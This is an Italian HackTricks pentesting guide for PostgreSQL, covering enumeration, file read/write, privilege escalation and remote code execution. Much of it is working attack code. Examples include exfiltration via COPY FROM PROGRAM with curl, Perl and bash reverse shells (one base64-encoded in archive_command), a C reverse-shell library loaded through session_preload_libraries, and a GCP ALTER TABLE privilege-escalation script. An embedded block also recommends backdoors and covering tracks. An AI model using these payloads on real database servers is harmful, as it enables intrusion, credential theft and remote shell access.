# 5432,5433 - Test di penetrazione su PostgreSQL

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare facilmente flussi di lavoro** supportati dagli strumenti della comunit√† **pi√π avanzati al mondo**.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione esclusiva di [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.

</details>

## **Informazioni di base**

**PostgreSQL** √® descritto come un **sistema di database ad oggetti-relazionale** che √® **open source**. Questo sistema non solo utilizza il linguaggio SQL ma lo potenzia anche con funzionalit√† aggiuntive. Le sue capacit√† gli permettono di gestire una vasta gamma di tipi di dati e operazioni, rendendolo una scelta versatile per sviluppatori e organizzazioni.

**Porta predefinita:** 5432, e se questa porta √® gi√† in uso sembra che postgresql utilizzer√† la porta successiva (probabilmente 5433) che non √® in uso.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Connessione e Enumerazione di Base
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Se eseguendo **`\list`** trovi un database chiamato **`rdsadmin`** sai di essere all'interno di un **database PostgreSQL AWS**.
{% endhint %}

Per ulteriori informazioni su **come abusare un database PostgreSQL** controlla:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Enumerazione Automatica
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Scansione delle porte**

Secondo [**questa ricerca**](https://www.exploit-db.com/papers/13084), quando un tentativo di connessione fallisce, `dblink` genera un'eccezione `sqlclient_unable_to_establish_sqlconnection` che include una spiegazione dell'errore. Di seguito sono elencati esempi di questi dettagli.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* Host √® gi√π

`DETTAGLI: impossibile connettersi al server: Nessuna route per l'host Il server √® in esecuzione sull'host "1.2.3.4" e accetta connessioni TCP/IP sulla porta 5678?`

* Porta √® chiusa
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* La porta √® aperta
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
```md
## PostgreSQL

### Enumeration

When conducting a penetration test against a PostgreSQL database server, start by enumerating the following:

1. **PostgreSQL Version**: Identify the version of PostgreSQL running on the server. This information can help determine potential vulnerabilities associated with that specific version.

2. **Database Users**: Enumerate the database users to understand the level of access each user has and identify any privileged accounts.

3. **Database Schemas**: Identify the database schemas to gain insights into the structure of the database and potential areas to target during testing.

4. **Network Services**: Determine the network services running on the server and identify any additional services that could be potential entry points.

### Exploitation

After completing the enumeration phase, proceed with exploiting any identified vulnerabilities or misconfigurations. Common exploitation techniques include:

1. **SQL Injection**: Exploit SQL injection vulnerabilities to extract data from the database or perform unauthorized actions.

2. **Weak Credentials**: Attempt to crack weak passwords or default credentials to gain unauthorized access to the database server.

3. **Privilege Escalation**: Look for opportunities to escalate privileges within the database server to gain higher levels of access.

### Post-Exploitation

Once access to the PostgreSQL database server is achieved, consider performing the following post-exploitation activities:

1. **Data Extraction**: Extract sensitive data from the database, such as user credentials, financial information, or intellectual property.

2. **Persistence**: Establish persistence on the server by creating backdoors or scheduled tasks to maintain access even after the penetration test is completed.

3. **Covering Tracks**: Remove any evidence of the penetration test activities to avoid detection and maintain stealth within the network.

By following these steps, penetration testers can effectively assess the security posture of PostgreSQL database servers and help organizations improve their overall security defenses.
```
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* La porta √® aperta o filtrata
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
In PL/pgSQL functions, attualmente non √® possibile ottenere i dettagli delle eccezioni. Tuttavia, se si ha accesso diretto al server PostgreSQL, √® possibile recuperare le informazioni necessarie. Se l'estrazione di nomi utente e password dalle tabelle di sistema non √® fattibile, si pu√≤ considerare l'utilizzo del metodo di attacco con lista di parole discusso nella sezione precedente, poich√© potrebbe produrre risultati positivi.

## Enumerazione dei Privilegi

### Ruoli

| Tipi di Ruoli  |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Il ruolo ha privilegi di superutente                                                                                                                 |
| rolinherit     | Il ruolo eredita automaticamente i privilegi dei ruoli di cui √® membro                                                                                |
| rolcreaterole  | Il ruolo pu√≤ creare altri ruoli                                                                                                                      |
| rolcreatedb    | Il ruolo pu√≤ creare database                                                                                                                         |
| rolcanlogin    | Il ruolo pu√≤ effettuare il login. In altre parole, questo ruolo pu√≤ essere dato come identificatore di autorizzazione della sessione iniziale         |
| rolreplication | Il ruolo √® un ruolo di replica. Un ruolo di replica pu√≤ avviare connessioni di replica e creare ed eliminare slot di replica.                       |
| rolconnlimit   | Per i ruoli che possono effettuare il login, imposta il numero massimo di connessioni simultanee che questo ruolo pu√≤ effettuare. -1 significa nessun limite. |
| rolpassword    | Non la password (viene sempre visualizzata come `********`)                                                                                          |
| rolvaliduntil  | Scadenza della password (utilizzata solo per l'autenticazione tramite password); nullo se non scade                                                   |
| rolbypassrls   | Il ruolo ignora ogni policy di sicurezza a livello di riga, vedere [Sezione 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) per ulteriori informazioni. |
| rolconfig      | Impostazioni predefinite del ruolo per le variabili di configurazione in esecuzione                                                                  |
| oid            | ID del ruolo                                                                                                                                        |

#### Gruppi Interessanti

* Se sei membro di **`pg_execute_server_program`** puoi **eseguire** programmi
* Se sei membro di **`pg_read_server_files`** puoi **leggere** file
* Se sei membro di **`pg_write_server_files`** puoi **scrivere** file

{% hint style="info" %}
Nota che in Postgres un **utente**, un **gruppo** e un **ruolo** sono la **stessa cosa**. Dipende solo da **come lo si utilizza** e se si **permette il login**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabelle
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funzioni
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Azioni del file system

### Leggere directory e file

Da questo [**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) i membri del gruppo definito **`DEFAULT_ROLE_READ_SERVER_FILES`** (chiamato **`pg_read_server_files`**) e **super utenti** possono utilizzare il metodo **`COPY`** su qualsiasi percorso (controllare `convert_and_check_filename` in `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Ricorda che se non sei un super utente ma hai i permessi **CREATEROLE** puoi **renderti membro di quel gruppo:**
```sql
GRANT pg_read_server_files TO username;
```
[**Maggiori informazioni.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Ci sono **altre funzioni di postgres** che possono essere utilizzate per **leggere file o elencare una directory**. Solo **superutenti** e **utenti con permessi espliciti** possono utilizzarle:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Puoi trovare **ulteriori funzioni** in [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Scrittura Semplice di File

Solo **super utenti** e membri di **`pg_write_server_files`** possono utilizzare la copia per scrivere file.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Ricorda che se non sei un super utente ma hai i permessi **`CREATEROLE`** puoi **renderti membro di quel gruppo:**
```sql
GRANT pg_write_server_files TO username;
```
[**Maggiori informazioni.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Ricorda che COPY non pu√≤ gestire i caratteri di nuova riga, quindi anche se stai utilizzando un payload in base64 **devi inviare un comando su una sola riga**.\
Una limitazione molto importante di questa tecnica √® che **`copy` non pu√≤ essere utilizzato per scrivere file binari in quanto modifica alcuni valori binari.**

### **Caricamento di file binari**

Tuttavia, ci sono **altre tecniche per caricare grandi file binari:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Suggerimento per bug bounty**: **iscriviti** a **Intigriti**, una piattaforma premium per **bug bounty creata da hacker, per hacker**! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi stesso e inizia a guadagnare taglie fino a **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### Aggiornamento dei dati della tabella PostgreSQL tramite scrittura di file locale

Se hai le autorizzazioni necessarie per leggere e scrivere file del server PostgreSQL, puoi aggiornare qualsiasi tabella sul server sovrascrivendo il file associato nella [directory dei dati di PostgreSQL](https://www.postgresql.org/docs/8.1/storage.html). **Maggiori informazioni su questa tecnica** [**qui**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Passaggi necessari:

1.  Ottenere la directory dei dati di PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Nota:** Se non riesci a recuperare il percorso corrente della directory dei dati dalle impostazioni, puoi interrogare la versione principale di PostgreSQL tramite la query `SELECT version()` e provare a forzare il percorso. I percorsi comuni della directory dei dati nelle installazioni Unix di PostgreSQL sono `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Un nome di cluster comune √® `main`.
2.  Ottenere un percorso relativo al filenode, associato alla tabella di destinazione

```sql
SELECT pg_relation_filepath('{NOME_TABELLA}')
```

Questa query dovrebbe restituire qualcosa come `base/3/1337`. Il percorso completo sul disco sar√† `$DATA_DIRECTORY/base/3/1337`, cio√® `/var/lib/postgresql/13/main/base/3/1337`.
3.  Scaricare il filenode tramite le funzioni `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```
4.  Ottenere il tipo di dati associato alla tabella di destinazione

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{NOME_TABELLA}';
```
5.  Utilizzare il [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) per [modificare il filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); impostare tutti i flag booleani `rol*` su 1 per le autorizzazioni complete.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_DA_PASSO_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![Demo del PostgreSQL Filenode Editor](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)
6.  Ricarica il filenode modificato tramite le funzioni `lo_*` e sovrascrivi il file originale sul disco

```sql
SELECT lo_from_bytea(13338,decode('{FILENODE_MODIFICATO_IN_BASE64}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```
7.  _(Opzionale)_ Svuota la cache della tabella in memoria eseguendo una query SQL costosa

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```
8. Ora dovresti vedere i valori della tabella aggiornati nel PostgreSQL.

Puoi anche diventare un superadmin modificando la tabella `pg_authid`. **Vedi** [**la seguente sezione**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE verso un programma**

Dal[ versione 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), solo **super utenti** e membri del gruppo **`pg_execute_server_program`** possono utilizzare copy per RCE (esempio con esfiltrazione:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Esempio da eseguire:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Ricorda che se non sei un super utente ma hai i permessi **`CREATEROLE`** puoi **aggiungerti come membro di quel gruppo:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Maggiori informazioni.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Oppure utilizzare il modulo `multi/postgres/postgres_copy_from_program_cmd_exec` da **metasploit**.\
Ulteriori informazioni su questa vulnerabilit√† [**qui**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Sebbene segnalata come CVE-2019-9193, Postges ha dichiarato che si tratta di una [funzionalit√† e non sar√† corretta](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE con Linguaggi PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE con Estensioni PostgreSQL

Una volta che hai **imparato** dal post precedente **come caricare file binari**, potresti provare a ottenere **RCE caricando un'estensione postgresql e caricandola**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE con file di configurazione PostgreSQL

{% hint style="info" %}
I seguenti vettori RCE sono particolarmente utili in contesti SQLi limitati, poich√© tutti i passaggi possono essere eseguiti tramite istruzioni SELECT nidificate
{% endhint %}

Il **file di configurazione** di PostgreSQL √® **scrivibile** dall'utente **postgres**, che √® quello che esegue il database, quindi come **superutente**, puoi scrivere file nel filesystem e quindi puoi **sovrascrivere questo file.**

![](<../.gitbook/assets/image (303).png>)

#### **RCE con ssl\_passphrase\_command**

Ulteriori informazioni [su questa tecnica qui](https://pulsesecurity.co.nz/articles/postgres-sqli).

Il file di configurazione ha alcuni attributi interessanti che possono portare a RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Percorso della chiave privata del database
* `ssl_passphrase_command = ''` Se il file privato √® protetto da password (criptato) postgresql **eseguir√† il comando indicato in questo attributo**.
* `ssl_passphrase_command_supports_reload = off` **Se** questo attributo √® **on**, il **comando** eseguito se la chiave √® protetta da password **verr√† eseguito** quando viene eseguito `pg_reload_conf()`.

Quindi, un attaccante dovr√†:

1. **Estrarre la chiave privata** dal server
2. **Criptare** la chiave privata scaricata:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Sovrascrivere**
4. **Estrarre** la corrente **configurazione** di postgresql
5. **Sovrascrivere** la **configurazione** con la configurazione degli attributi menzionati:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Eseguire `pg_reload_conf()`

Durante i test ho notato che ci√≤ funzioner√† solo se il **file della chiave privata ha privilegi 640**, √® **di propriet√† di root** e del **gruppo ssl-cert o postgres** (in modo che l'utente postgres possa leggerlo) e si trova in _/var/lib/postgresql/12/main_.

#### **RCE con archive\_command**

**Ulteriori** [**informazioni su questa configurazione e su WAL qui**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Un altro attributo nel file di configurazione che √® sfruttabile √® `archive_command`.

Per far funzionare questo, l'impostazione `archive_mode` deve essere `'on'` o `'always'`. Se √® vero, allora potremmo sovrascrivere il comando in `archive_command` e forzarlo ad eseguire tramite le operazioni WAL (write-ahead logging).

I passaggi generali sono:

1. Verificare se la modalit√† di archiviazione √® abilitata: `SELECT current_setting('archive_mode')`
2. Sovrascrivere `archive_command` con il payload. Ad esempio, una shell inversa: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Ricaricare la configurazione: `SELECT pg_reload_conf()`
4. Forzare l'operazione WAL a eseguire, che chiamer√† il comando di archiviazione: `SELECT pg_switch_wal()` o `SELECT pg_switch_xlog()` per alcune versioni di Postgres

#### **RCE con librerie di caricamento anticipato**

Ulteriori informazioni [su questa tecnica qui](https://adeadfed.com/posts/postgresql-select-only-rce/).

Questo vettore di attacco sfrutta le seguenti variabili di configurazione:

* `session_preload_libraries` -- librerie che verranno caricate dal server PostgreSQL alla connessione del client.
* `dynamic_library_path` -- elenco delle directory in cui il server PostgreSQL cercher√† le librerie.

Possiamo impostare il valore di `dynamic_library_path` su una directory scrivibile dall'utente `postgres` che esegue il database, ad esempio la directory `/tmp/`, e caricare un oggetto `.so` dannoso l√¨. Successivamente, forzeremo il server PostgreSQL a caricare la nostra nuova libreria caricata includendola nella variabile `session_preload_libraries`.

I passaggi dell'attacco sono:

1. Scaricare il `postgresql.conf` originale
2. Includere la directory `/tmp/` nel valore di `dynamic_library_path`, ad esempio `dynamic_library_path = '/tmp:$libdir'`
3. Includere il nome della libreria dannosa nel valore di `session_preload_libraries`, ad esempio `session_preload_libraries = 'payload.so'`
4. Verificare la versione principale di PostgreSQL tramite la query `SELECT version()`
5. Compilare il codice della libreria dannosa con il pacchetto dev PostgreSQL corretto Codice di esempio:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
codice preso da https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compilare il codice:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```
6. Caricare il `postgresql.conf` dannoso, creato nei passaggi 2-3, e sovrascrivere l'originale
7. Caricare il `payload.so` dal passaggio 5 nella directory `/tmp`
8. Ricaricare la configurazione del server riavviando il server o invocando la query `SELECT pg_reload_conf()`
9. Alla successiva connessione al DB, riceverai la connessione della shell inversa.
## **Privilegi di Postgres**

### Privilegi di CREATEROLE

#### **Concessione**

Secondo i [**documenti**](https://www.postgresql.org/docs/13/sql-grant.html): _I ruoli che hanno il privilegio **`CREATEROLE`** possono **concedere o revocare l'appartenenza a qualsiasi ruolo** che **non** √® un **superuser**._

Quindi, se hai il permesso di **`CREATEROLE`** potresti concederti l'accesso ad altri **ruoli** (che non siano superuser) che ti consentono di leggere e scrivere file ed eseguire comandi:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modifica Password

Gli utenti con questo ruolo possono anche **cambiare** le **password** di altri **non-superutenti**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc a SUPERUSER

√à abbastanza comune scoprire che **gli utenti locali possono accedere a PostgreSQL senza fornire alcuna password**. Pertanto, una volta ottenuti **i permessi per eseguire codice**, √® possibile sfruttare tali permessi per ottenere il ruolo di **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Questo √® di solito possibile a causa delle seguenti righe nel file **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

In [**questo articolo**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) √® spiegato come sia stato possibile fare **privesc** in Postgres GCP sfruttando il privilegio ALTER TABLE concesso all'utente.

Quando si cerca di **assegnare la propriet√† di una tabella a un altro utente**, dovresti ricevere un **errore** che lo impedisce, ma apparentemente GCP ha dato questa **opzione all'utente postgres non-superuser** in GCP:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Unendo questa idea al fatto che quando i comandi **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) vengono eseguiti su una **tabella con una funzione di indice**, la **funzione** viene **chiamata** come parte del comando con i **permessi del proprietario della tabella**. √à possibile creare un indice con una funzione e dare i permessi di proprietario a un **super utente** su quella tabella, e quindi eseguire ANALYZE sulla tabella con la funzione dannosa che sar√† in grado di eseguire comandi perch√© sta utilizzando i privilegi del proprietario.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Sfruttamento

1. Inizia creando una nuova tabella.
2. Inserisci del contenuto non rilevante nella tabella per fornire dati alla funzione di indice.
3. Sviluppa una funzione di indice dannosa che contiene un payload di esecuzione del codice, consentendo l'esecuzione di comandi non autorizzati.
4. ALTERA il proprietario della tabella in "cloudsqladmin," che √® il ruolo di superutente di GCP utilizzato esclusivamente da Cloud SQL per gestire e mantenere il database.
5. Esegui un'operazione ANALYZE sulla tabella. Questa azione costringe il motore PostgreSQL a passare al contesto utente del proprietario della tabella, "cloudsqladmin." Di conseguenza, la funzione di indice dannosa viene chiamata con i permessi di "cloudsqladmin," consentendo cos√¨ l'esecuzione del comando shell precedentemente non autorizzato.

In PostgreSQL, questo flusso appare pi√π o meno cos√¨:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Quindi, la tabella `shell_commands_results` conterr√† l'output del codice eseguito:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Accesso Locale

Alcune istanze di postgresql mal configurate potrebbero consentire l'accesso di qualsiasi utente locale, √® possibile accedere localmente da 127.0.0.1 utilizzando la funzione **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Si noti che per far funzionare la query precedente **deve esistere la funzione `dblink`**. Se non esiste, √® possibile provare a crearla con
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Se hai la password di un utente con privilegi superiori, ma all'utente non √® consentito effettuare il login da un IP esterno, puoi utilizzare la seguente funzione per eseguire query come quell'utente:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
√à possibile verificare se questa funzione esiste con:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Funzione definita dall'utente con** SECURITY DEFINER

[Nel seguente articolo](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), i pentester sono riusciti a ottenere privilegi all'interno di un'istanza di postgres fornita da IBM, poich√© **hanno trovato questa funzione con il flag SECURITY DEFINER**:

